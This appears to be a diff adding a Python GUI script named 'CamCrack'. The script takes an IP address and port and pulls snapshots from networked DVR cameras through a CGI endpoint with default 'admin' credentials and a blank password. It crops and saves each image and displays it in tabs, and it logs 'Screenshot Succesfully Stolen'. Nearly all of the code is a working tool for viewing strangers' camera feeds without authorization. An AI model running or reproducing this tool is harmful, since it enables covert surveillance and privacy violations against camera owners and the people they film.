@@ -1,0 +1,81 @@
+3 locations that say 'YOURPATH' need to be replaced with your own path
+
+
+from tkinter import *
+from tkinter import ttk
+from bs4 import BeautifulSoup
+import requests
+from selenium import webdriver
+from io import BytesIO
+from PIL import Image
+import time
+
+timeStamp = time.time()
+
+
+window = Tk()
+window.title('CamCrack v1.github')
+
+Label(window, text="IP Address:" ) .grid(row=0, column=0, sticky=W)
+var_ip = Entry(window, width=15, )
+var_ip.grid(row=0, column=1,sticky=SW)
+
+Label(window, text="Port number:" ) .grid(row=0, column=2, sticky=W)
+var_port = Entry(window, width=9, )
+var_port.grid(row=0, column=3,sticky=W)
+
+
+geckodriver = 'C:\\Users\\YOURPATH\\geckodriver.exe'   # replace 'YOURPATH'<<<<<
+options = webdriver.FirefoxOptions()
+options.add_argument('-headless')
+browser = webdriver.Firefox(executable_path=geckodriver, options=options)
+
+
+# The function is defined but the variable does not transfer to the next function
+def find_cam_count():
+    session = requests.Session()
+    response = session.get(url)
+    session.close()
+    soup = BeautifulSoup(response.content, 'xml')
+    tag = soup.find('devinfo')
+    cam_count = int(tag.get('camcnt'))
+    return(cam_count)
+#find_cam_count() <--------- THIS
+    
+def man_defeway():
+    nb = ttk.Notebook(window)
+    nb.grid(row=1, column=0, sticky='NSEW')
+    print('START:', time.time() - timeStamp)
+    def get_screenshot(cam_count):
+        for i in range(0,cam_count):
+            var_defeway = '/cgi-bin/snapshot.cgi?chn=' + str(i) + '&u=admin&p=&q=0'
+            var_defeway_url = 'http://' + var_ip.get() + ':' + var_port.get() + var_defeway
+            browser.get(var_defeway_url)
+            print('Camera ' + str(i) + ': Accessed' , time.time() - timeStamp)
+            element = browser.find_element_by_tag_name('img')
+            location = element.location
+            size = element.size
+            png = browser.get_screenshot_as_png()
+            im = Image.open(BytesIO(png))
+            print('Screenshot ' + str(i) + ': Succesfully Stolen',time.time() - timeStamp)
+            left = location['x']
+            top = location['y']
+            right = location['x'] + size['width']
+            bottom = location['y'] + size['height']
+            im = im.crop((left, top, right, bottom))
+            #print('Image: ' + str(i) + ': Cropped', time.time() - timeStamp)
+            im.save('C:\\Users\\YOURPATH\\newshot' + str(i) + '.png') # replace 'YOURPATH'<<<<
+            #print('Image ' + str(i) + ' Saved', time.time() - timeStamp)
+            print('Camera ' + str(i) + ': Completed and Preparing for Display', time.time() - timeStamp)
+            print("")
+            tab = ttk.Frame(nb)
+            nb.add(tab, text="Camera " + str(i))
+            snap = PhotoImage(file='C:\\Users\\YOURPATH\\newshot' + str(i) + '.png') # replace 'YOURPATH'<<<
+            snap.image = snap
+            Label(tab, image=snap) .grid(row=0, column=0, sticky=W)
+    get_screenshot(4)
+    
+    
+Button(window,text="run", width=3, command=man_defeway) .grid (row=0, column=4)
+
+window.mainloop()
